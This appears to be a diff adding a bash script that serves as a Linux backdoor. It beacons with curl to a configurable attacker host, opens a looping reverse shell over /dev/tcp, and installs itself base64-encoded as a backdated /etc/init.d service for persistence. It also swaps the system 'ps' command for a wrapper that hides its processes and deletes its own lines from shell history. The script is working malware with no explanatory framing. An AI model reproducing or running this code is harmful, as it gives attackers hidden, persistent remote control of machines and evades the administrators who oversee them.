@@ -1,0 +1,38 @@
+#!/bin/bash
+
+ip=ip_
+port=port_
+portsrv=portsrv_
+
+echo '#!/bin/bash' > .lnv
+echo """curl -s http://$ip:$portsrv/C4Na1hAk3r >/dev/null &""" >> .lnv
+echo 'sleep 2' >> .lnv
+echo 'while true;do' >> .lnv
+echo """bash 2>/dev/null >& /dev/tcp/$ip/$port 2>&1 0<&1 2>/dev/null""" >> .lnv
+echo 'if [ $(ps -aux | grep "sleep 112358" | grep -v grep | wc -c) -gt 5 ];then exit;fi' >> .lnv
+echo '	while true;do' >> .lnv
+echo '		if [ $(ps -aux | grep "'$ip $port'" | grep -v "grep" | wc -c) -gt 10 ];then' >> .lnv
+echo '			sleep 10.354654' >> .lnv
+echo '		else' >> .lnv
+echo '			break;' >> .lnv
+echo '		fi' >> .lnv
+echo '	done' >> .lnv
+echo 'sleep 20.354654' >> .lnv
+echo 'done' >> .lnv
+
+touch -d "13 month ago" /etc/init.d/lnv1
+echo '#!/bin/bash' > /etc/init.d/lnv1
+echo "echo $(cat .lnv | base64 -w 0) | base64 -d | bash" >> /etc/init.d/lnv1
+chmod 755 /etc/init.d/lnv1
+update-rc.d lnv1 defaults 2>/dev/null &
+rm .lnv
+
+var=$(which ps | awk -F "ps" '{print $1}')
+mv """$var/ps""" """$var/.ps"""
+sleep 0.2
+echo '#!/bin/bash' > $var/ps
+echo '.ps "$@" | grep -v "$(echo '$(echo $port | base64)' | base64 -d)" | grep -v ".354654" | grep -v " .ps "' >> $var/ps
+chmod 755 $var/ps
+history -d $(history | awk -F " " '{print $1}' | tail -n 2 | xargs) 2>/dev/null
+source /etc/init.d/lnv1
+tput reset
